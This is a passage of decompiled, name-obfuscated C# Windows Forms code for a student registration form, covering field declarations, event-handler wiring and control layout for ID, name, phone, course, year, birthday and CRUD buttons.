using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Ag80Sw;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using MySql.Data.MySqlClient;
using p6F5Wj;
using r7SMc5;

namespace x5Q4Lq;

[DesignerGenerated]
public class Qf50Jc : Form
{
	[StructLayout(LayoutKind.Auto)]
	internal struct k5G1Js
	{
		internal int int_0;

		internal object object_0;

		internal object object_1;

		internal object object_2;

		internal object object_3;

		internal object object_4;

		internal object object_5;
	}

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("idnumber")]
	private TextBox _idnumber;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("yrcmb")]
	private ComboBox _yrcmb;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("studentsearchbutton")]
	private Button _studentsearchbutton;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("Button5")]
	private Button _Button5;

	[AccessedThroughProperty("Label8")]
	private Label _Label8;

	[AccessedThroughProperty("Label9")]
	private Label _Label9;

	private MySqlConnection mysqlConn;

	private MySqlCommand COMMAND;

	private MySqlDataAdapter adp;

	private o9A2Ym.g8M1Jo g8M1Jo_0;

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		get
		{
			return g8M1Jo_0.label_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Expected O, but got Unknown
			g8M1Jo_0.label_0 = value;
		}
	}

	internal virtual Label Label3
	{
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		get
		{
			return g8M1Jo_0.label_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			g8M1Jo_0.label_1 = ((value is Label) ? value : null);
		}
	}

	internal virtual TextBox idnumber
	{
		get
		{
			return _idnumber;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Expected O, but got Unknown
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			MulticastDelegate multicastDelegate = (MulticastDelegate)new KeyPressEventHandler(Qy42Ei);
			object obj = _idnumber;
			if ((int)(TextBox)obj != 0)
			{
				((Control)(TextBox)obj).remove_KeyPress((KeyPressEventHandler)multicastDelegate);
			}
			_idnumber = value;
			obj = _idnumber;
			if (obj is TextBox)
			{
				((Control)(TextBox)obj).add_KeyPress((KeyPressEventHandler)(object)((multicastDelegate is KeyPressEventHandler) ? multicastDelegate : null));
			}
		}
	}

	internal virtual TextBox studentname
	{
		get
		{
			return g8M1Jo_0.textBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Unknown result type (might be due to invalid IL or missing references)
			//IL_0032: Expected O, but got Unknown
			MulticastDelegate multicastDelegate = (MulticastDelegate)new KeyPressEventHandler(r9X1Zb);
			TextBoxBase textBox_ = (TextBoxBase)(object)g8M1Jo_0.textBox_0;
			if (textBox_ is TextBox)
			{
				((Control)(TextBox)textBox_).remove_KeyPress((KeyPressEventHandler)multicastDelegate);
			}
			g8M1Jo_0.textBox_0 = ((value is TextBox) ? value : null);
			textBox_ = (TextBoxBase)(object)g8M1Jo_0.textBox_0;
			if (textBox_ is TextBox)
			{
				((Control)((textBox_ is TextBox) ? textBox_ : null)).add_KeyPress((KeyPressEventHandler)(object)((multicastDelegate is KeyPressEventHandler) ? multicastDelegate : null));
			}
		}
	}

	internal virtual TextBox phonenumber
	{
		get
		{
			return g8M1Jo_0.textBox_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			object obj = (object)new KeyPressEventHandler(i9R0Hs);
			TextBoxBase textBox_ = (TextBoxBase)(object)g8M1Jo_0.textBox_1;
			if ((int)(TextBox)textBox_ != 0)
			{
				((Control)((textBox_ is TextBox) ? textBox_ : null)).remove_KeyPress((KeyPressEventHandler)((obj is KeyPressEventHandler) ? obj : null));
			}
			g8M1Jo_0.textBox_1 = ((value is TextBox) ? value : null);
			textBox_ = (TextBoxBase)(object)g8M1Jo_0.textBox_1;
			if (textBox_ is TextBox)
			{
				((Control)((textBox_ is TextBox) ? textBox_ : null)).add_KeyPress((KeyPressEventHandler)((obj is KeyPressEventHandler) ? obj : null));
			}
		}
	}

	internal virtual ComboBox coursecmb
	{
		get
		{
			return g8M1Jo_0.comboBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Expected O, but got Unknown
			g8M1Jo_0.comboBox_0 = value;
		}
	}

	internal virtual Label Label5
	{
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual ComboBox yrcmb
	{
		get
		{
			return _yrcmb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_yrcmb = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return g8M1Jo_0.button_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_0052: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			MulticastDelegate multicastDelegate = new EventHandler(Tf3e2B);
			object button_ = g8M1Jo_0.button_0;
			if (button_ is Button)
			{
				((Control)(Button)button_).remove_Click(multicastDelegate as EventHandler);
			}
			g8M1Jo_0.button_0 = ((value is Button) ? value : null);
			button_ = g8M1Jo_0.button_0;
			if ((int)(Button)button_ != 0)
			{
				((Control)(Button)button_).add_Click(multicastDelegate as EventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			object obj = new EventHandler(t1WXn6);
			object button = _Button2;
			if ((int)(Button)button != 0)
			{
				((Control)(Button)button).remove_Click((EventHandler)obj);
			}
			_Button2 = value;
			button = _Button2;
			if (button is Button)
			{
				((Control)(Button)button).add_Click((EventHandler)obj);
			}
		}
	}

	internal virtual Button Button3
	{
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0044: Unknown result type (might be due to invalid IL or missing references)
			object obj = new EventHandler(e9HAm3);
			IButtonControl button = (IButtonControl)(object)_Button3;
			if (button is Button)
			{
				((Control)(Button)button).remove_Click((EventHandler)obj);
			}
			_Button3 = value;
			button = (IButtonControl)(object)_Button3;
			if (button is Button)
			{
				((Control)(Button)button).add_Click((EventHandler)obj);
			}
		}
	}

	internal virtual Button Button4
	{
		get
		{
			return g8M1Jo_0.button_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0045: Expected O, but got Unknown
			//IL_0052: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			MulticastDelegate multicastDelegate = new EventHandler(Mc2s8D);
			object button_ = g8M1Jo_0.button_1;
			if ((int)(Button)button_ != 0)
			{
				((Control)((button_ is Button) ? button_ : null)).remove_Click(multicastDelegate as EventHandler);
			}
			g8M1Jo_0.button_1 = value;
			button_ = g8M1Jo_0.button_1;
			if ((int)(Button)button_ != 0)
			{
				((Control)(Button)button_).add_Click(multicastDelegate as EventHandler);
			}
		}
	}

	internal virtual Label Label6
	{
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Button studentsearchbutton
	{
		get
		{
			return _studentsearchbutton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			MulticastDelegate multicastDelegate = new EventHandler(q3C0Zn);
			IButtonControl val = (IButtonControl)(object)_studentsearchbutton;
			if ((int)(Button)val != 0)
			{
				((Control)(Button)val).remove_Click((EventHandler)multicastDelegate);
			}
			_studentsearchbutton = value;
			val = (IButtonControl)(object)_studentsearchbutton;
			if (val is Button)
			{
				((Control)((val is Button) ? val : null)).add_Click(multicastDelegate as EventHandler);
			}
		}
	}

	public virtual ListView ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			MulticastDelegate multicastDelegate = new EventHandler(y9NYi7);
			object obj = new EventHandler(Kt64Jj);
			Control listView = (Control)(object)_ListView1;
			if (listView is ListView)
			{
				((listView is ListView) ? listView : null).remove_Click(multicastDelegate as EventHandler);
				((ListView)listView).remove_SelectedIndexChanged(obj as EventHandler);
			}
			_ListView1 = value;
			listView = (Control)(object)_ListView1;
			if (listView is ListView)
			{
				((listView is ListView) ? listView : null).add_Click(multicastDelegate as EventHandler);
				((ListView)((listView is ListView) ? listView : null)).add_SelectedIndexChanged(obj as EventHandler);
			}
		}
	}

	internal virtual Button Button5
	{
		get
		{
			return _Button5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			MulticastDelegate multicastDelegate = new EventHandler(q2RDk9);
			IButtonControl button = (IButtonControl)(object)_Button5;
			if (button is Button)
			{
				((Control)((button is Button) ? button : null)).remove_Click(multicastDelegate as EventHandler);
			}
			_Button5 = value;
			button = (IButtonControl)(object)_Button5;
			if (button is Button)
			{
				((Control)((button is Button) ? button : null)).add_Click((EventHandler)multicastDelegate);
			}
		}
	}

	internal virtual Label Label8
	{
		get
		{
			return _Label8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label8 = value;
		}
	}

	internal virtual Label Label9
	{
		get
		{
			return _Label9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label9 = value;
		}
	}

	internal virtual DateTimePicker studentbirthday
	{
		get
		{
			return g8M1Jo_0.dateTimePicker_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			MulticastDelegate multicastDelegate = new EventHandler(Bn28Ly);
			Control dateTimePicker_ = (Control)(object)g8M1Jo_0.dateTimePicker_0;
			if (dateTimePicker_ is DateTimePicker)
			{
				((DateTimePicker)dateTimePicker_).remove_ValueChanged(multicastDelegate as EventHandler);
			}
			g8M1Jo_0.dateTimePicker_0 = ((value is DateTimePicker) ? value : null);
			dateTimePicker_ = (Control)(object)g8M1Jo_0.dateTimePicker_0;
			if (dateTimePicker_ is DateTimePicker)
			{
				((DateTimePicker)dateTimePicker_).add_ValueChanged(multicastDelegate as EventHandler);
			}
		}
	}

	internal virtual Label studentage
	{
		get
		{
			return g8M1Jo_0.label_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Expected O, but got Unknown
			g8M1Jo_0.label_2 = value;
		}
	}

	public Qf50Jc()
	{
		((Form)this).add_Load((EventHandler)Hc39Di);
		ISupportInitializeNotification supportInitializeNotification = new DataTable();
		g8M1Jo_0.dataTable_0 = supportInitializeNotification as DataTable;
		Xo90Zq();
	}

	protected override void n8XKk4(bool Ay69Yi)
	{
		try
		{
			if (Ay69Yi && g8M1Jo_0.icontainer_0 != null)
			{
				g8M1Jo_0.icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Ay69Yi);
		}
	}

	private void Xo90Zq()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_02c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Expected O, but got Unknown
		//IL_02f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0341: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Expected O, but got Unknown
		//IL_036f: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Expected O, but got Unknown
		//IL_03ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d1: Expected O, but got Unknown
		//IL_0572: Unknown result type (might be due to invalid IL or missing references)
		//IL_067f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0689: Expected O, but got Unknown
		//IL_06ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_076d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0777: Expected O, but got Unknown
		//IL_079b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0832: Unknown result type (might be due to invalid IL or missing references)
		//IL_083c: Expected O, but got Unknown
		//IL_0860: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0901: Expected O, but got Unknown
		//IL_0925: Unknown result type (might be due to invalid IL or missing references)
		//IL_09bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c6: Expected O, but got Unknown
		//IL_09ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a54: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a5e: Expected O, but got Unknown
		//IL_0aa6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b28: Expected O, but got Unknown
		//IL_0c2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c34: Expected O, but got Unknown
		//IL_0c58: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cd2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cdc: Expected O, but got Unknown
		//IL_0d0c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e53: Expected O, but got Unknown
		//IL_0e83: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ee0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eea: Expected O, but got Unknown
		//IL_0f0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_112d: Unknown result type (might be due to invalid IL or missing references)
		object obj = new ComponentResourceManager(typeof(Qf50Jc));
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		idnumber = new TextBox();
		studentname = new TextBox();
		phonenumber = new TextBox();
		coursecmb = new ComboBox();
		Label5 = new Label();
		yrcmb = new ComboBox();
		Button1 = new Button();
		Button2 = new Button();
		Button3 = new Button();
		Button4 = new Button();
		ListView1 = new ListView();
		Label6 = new Label();
		studentage = new Label();
		Button5 = new Button();
		studentbirthday = new DateTimePicker();
		Label9 = new Label();
		Label8 = new Label();
		studentsearchbutton = new Button();
		PictureBox1 = new PictureBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(90, 147));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(81, 17));
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("ID number: ");
		Label2.set_AutoSize(true);
		((Control)Label2).set_Location(new Point(90, 187));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(102, 17));
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("Student Name:");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Location(new Point(513, 144));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(111, 17));
		((Control)Label3).set_TabIndex(2);
		Label3.set_Text("Phone Number: ");
		Label4.set_AutoSize(true);
		((Control)Label4).set_Location(new Point(513, 182));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(57, 17));
		((Control)Label4).set_TabIndex(3);
		Label4.set_Text("Course:");
		((Control)idnumber).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)idnumber).set_Location(new Point(199, 142));
		((Control)idnumber).set_Margin(new Padding(3, 2, 3, 2));
		((Control)idnumber).set_Name("idnumber");
		((Control)idnumber).set_Size(new Size(258, 26));
		((Control)idnumber).set_TabIndex(4);
		((Control)studentname).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)studentname).set_Location(new Point(199, 182));
		((Control)studentname).set_Margin(new Padding(3, 2, 3, 2));
		((Control)studentname).set_Name("studentname");
		((Control)studentname).set_Size(new Size(258, 26));
		((Control)studentname).set_TabIndex(5);
		((Control)phonenumber).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)phonenumber).set_Location(new Point(622, 138));
		((Control)phonenumber).set_Margin(new Padding(3, 2, 3, 2));
		((Control)phonenumber).set_Name("phonenumber");
		((Control)phonenumber).set_Size(new Size(258, 26));
		((Control)phonenumber).set_TabIndex(6);
		coursecmb.get_AutoCompleteCustomSource().AddRange(new string[11]
		{
			"BSCE", "BSEE", "BTLED", "BSIT", "BTVTED", "BSE", "BSIT", "BSA", "BSNursing", "Midwifery",
			"BSIndus"
		});
		coursecmb.set_AutoCompleteSource((AutoCompleteSource)64);
		coursecmb.set_DropDownStyle((ComboBoxStyle)2);
		((Control)coursecmb).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)coursecmb).set_FormattingEnabled(true);
		coursecmb.get_Items().AddRange(new object[11]
		{
			"BSCE", "BSEE", "BTLED", "BSIT", "BTVTED", "BSE", "BSIT", "BSA", "BSNursing", "Midwifery",
			"BSIndus"
		});
		((Control)coursecmb).set_Location(new Point(622, 177));
		((Control)coursecmb).set_Margin(new Padding(3, 2, 3, 2));
		((Control)coursecmb).set_Name("coursecmb");
		((Control)coursecmb).set_Size(new Size(258, 28));
		((Control)coursecmb).set_TabIndex(7);
		Label5.set_AutoSize(true);
		((Control)Label5).set_Location(new Point(901, 141));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(80, 17));
		((Control)Label5).set_TabIndex(8);
		Label5.set_Text("Year Level:");
		yrcmb.get_AutoCompleteCustomSource().AddRange(new string[5] { "1st", "2nd", "3rd", "4th", "5th" });
		yrcmb.set_AutoCompleteSource((AutoCompleteSource)64);
		yrcmb.set_DropDownStyle((ComboBoxStyle)2);
		((Control)yrcmb).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)yrcmb).set_FormattingEnabled(true);
		yrcmb.get_Items().AddRange(new object[4] { "1st", "2nd", "3rd", "4th" });
		((Control)yrcmb).set_Location(new Point(1010, 133));
		((Control)yrcmb).set_Margin(new Padding(3, 2, 3, 2));
		((Control)yrcmb).set_Name("yrcmb");
		((Control)yrcmb).set_Size(new Size(258, 28));
		((Control)yrcmb).set_TabIndex(9);
		((ButtonBase)Button1).set_BackColor(SystemColors.ButtonShadow);
		((ButtonBase)Button1).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Button1).set_Location(new Point(465, 261));
		((Control)Button1).set_Margin(new Padding(3, 2, 3, 2));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(70, 36));
		((Control)Button1).set_TabIndex(10);
		((ButtonBase)Button1).set_Text("Save");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button2).set_BackColor(SystemColors.ButtonShadow);
		((ButtonBase)Button2).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button2).set_FlatStyle((FlatStyle)0);
		((Control)Button2).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Button2).set_Location(new Point(541, 261));
		((Control)Button2).set_Margin(new Padding(3, 2, 3, 2));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(70, 36));
		((Control)Button2).set_TabIndex(11);
		((ButtonBase)Button2).set_Text("Add");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button3).set_BackColor(SystemColors.ButtonShadow);
		((ButtonBase)Button3).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button3).set_FlatStyle((FlatStyle)0);
		((Control)Button3).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Button3).set_Location(new Point(774, 261));
		((Control)Button3).set_Margin(new Padding(3, 2, 3, 2));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(70, 36));
		((Control)Button3).set_TabIndex(12);
		((ButtonBase)Button3).set_Text("Delete");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button4).set_BackColor(SystemColors.ButtonShadow);
		((ButtonBase)Button4).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button4).set_FlatStyle((FlatStyle)0);
		((Control)Button4).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Button4).set_Location(new Point(692, 261));
		((Control)Button4).set_Margin(new Padding(3, 2, 3, 2));
		((Control)Button4).set_Name("Button4");
		((Control)Button4).set_Size(new Size(76, 36));
		((Control)Button4).set_TabIndex(13);
		((ButtonBase)Button4).set_Text("Update");
		((ButtonBase)Button4).set_UseVisualStyleBackColor(false);
		((Control)ListView1).set_Font(new Font("Microsoft Sans Serif", 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ListView1.set_FullRowSelect(true);
		ListView1.set_GridLines(true);
		ListView1.set_HideSelection(false);
		((Control)ListView1).set_Location(new Point(146, 314));
		((Control)ListView1).set_Margin(new Padding(3, 2, 3, 2));
		((Control)ListView1).set_Name("ListView1");
		((Control)ListView1).set_Size(new Size(1053, 313));
		((Control)ListView1).set_TabIndex(14);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		ListView1.set_View((View)1);
		Label6.set_AutoSize(true);
		((Control)Label6).set_Font(new Font("Arial Rounded MT Bold", 16f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_Location(new Point(575, 53));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(286, 32));
		((Control)Label6).set_TabIndex(16);
		Label6.set_Text("Student Registration");
		studentage.set_AutoSize(true);
		((Control)studentage).set_Location(new Point(1007, 218));
		((Control)studentage).set_Name("studentage");
		((Control)studentage).set_Size(new Size(16, 17));
		((Control)studentage).set_TabIndex(25);
		studentage.set_Text("0");
		((ButtonBase)Button5).set_BackColor(SystemColors.ButtonShadow);
		((ButtonBase)Button5).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)Button5).set_FlatStyle((FlatStyle)0);
		((Control)Button5).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Button5).set_Location(new Point(617, 261));
		((Control)Button5).set_Margin(new Padding(3, 2, 3, 2));
		((Control)Button5).set_Name("Button5");
		((Control)Button5).set_Size(new Size(70, 36));
		((Control)Button5).set_TabIndex(14);
		((ButtonBase)Button5).set_Text("Edit");
		((ButtonBase)Button5).set_UseVisualStyleBackColor(false);
		studentbirthday.set_CustomFormat("yyyy-MM-dd");
		((Control)studentbirthday).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		studentbirthday.set_Format((DateTimePickerFormat)8);
		((Control)studentbirthday).set_Location(new Point(1010, 177));
		((Control)studentbirthday).set_Margin(new Padding(3, 2, 3, 2));
		((Control)studentbirthday).set_Name("studentbirthday");
		((Control)studentbirthday).set_Size(new Size(258, 26));
		((Control)studentbirthday).set_TabIndex(23);
		studentbirthday.set_Value(new DateTime(2022, 7, 2, 0, 0, 0, 0));
		Label9.set_AutoSize(true);
		((Control)Label9).set_Location(new Point(901, 218));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(37, 17));
		((Control)Label9).set_TabIndex(22);
		Label9.set_Text("Age:");
		Label8.set_AutoSize(true);
		((Control)Label8).set_Location(new Point(901, 182));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(64, 17));
		((Control)Label8).set_TabIndex(21);
		Label8.set_Text("Birthday:");
		((Control)studentsearchbutton).set_BackgroundImage((Image)((ComponentResourceManager)obj).GetObject("studentsearchbutton.BackgroundImage"));
		((Control)studentsearchbutton).set_BackgroundImageLayout((ImageLayout)3);
		((Control)studentsearchbutton).set_Location(new Point(470, 142));
		((Control)studentsearchbutton).set_Margin(new Padding(3, 2, 3, 2));
		((Control)studentsearchbutton).set_Name("studentsearchbutton");
		((Control)studentsearchbutton).set_Size(new Size(27, 22));
		((Control)studentsearchbutton).set_TabIndex(18);
		((ButtonBase)studentsearchbutton).set_UseVisualStyleBackColor(true);
		PictureBox1.set_Image((Image)(obj as ComponentResourceManager).GetObject("PictureBox1.Image"));
		((Control)PictureBox1).set_Location(new Point(500, 32));
		((Control)PictureBox1).set_Margin(new Padding(3, 2, 3, 2));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(69, 61));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(17);
		PictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
